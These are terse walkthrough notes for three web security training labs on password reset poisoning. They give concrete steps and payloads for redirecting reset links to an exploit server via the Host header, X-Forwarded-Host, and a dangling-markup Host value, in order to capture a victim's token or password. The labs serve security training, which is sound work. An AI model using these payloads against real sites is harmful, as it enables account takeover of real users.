# Lab: Basic password reset poisoning

Forgot password -> Enter username = carlos -> Capture the request in burp -> Go to exploit server -> Copy the exploit url (exploit-[id].exploit-server.net/exploit) -> In burp, Change the Host to exploit-[id].exploit-server.net/exploit -> Send -> Go to exploit server - access log -> You will get the token:
`GET /exploit/forgot-password?temp-forgot-password-token=y8ntm0p7fd4v2o8lo6tsak86op8eavx7` ->
Go to `https://[id].web-security-academy.net//forgot-password?temp-forgot-password-token=y8ntm0p7fd4v2o8lo6tsak86op8eavx7` and then you can enter a new password -> then login as carlos



# Lab: Password reset poisoning via middleware

Forgot password -> Enter username = carlos -> Capture the request in burp -> Go to exploit server -> Copy the exploit url (exploit-[id].exploit-server.net/exploit) -> In burp, Add `X-Forwarded-Host: exploit-[id].exploit-server.net/exploit` -> Send -> Go to exploit server - access log -> You will get the token: 
`GET /forgot-password?temp-forgot-password-token=85cjg3lq7f7k92tv3ywgpoxrzqvmbtue` -> 
Go to `https://[id].web-security-academy.net//forgot-password?temp-forgot-password-token=85cjg3lq7f7k92tv3ywgpoxrzqvmbtue` and then you can enter a new password -> then login as carlos



# Lab: Password reset poisoning via dangling markup

Forgot password -> Enter your own username -> Capture POST request in Burp -> In Repeater, change Host header to add an arbitrary port: `[id].web-security-academy.net:1234` -> Send -> Go to exploit server -> Open email client -> View raw version of email -> Notice your port reflected unescaped in a link followed by the new password -> 
Now inject dangling markup: `Host: [id].web-security-academy.net:'<a href="//YOUR-EXPLOIT-ID.exploit-server.net/` -> Send -> Check email client (raw version) -> Go to exploit server access log -> Find `GET /?/login'>...` containing the rest of the email with your password -> Change username to `carlos` -> Send -> Refresh access log -> Get Carlos's new password from log -> Login as carlos
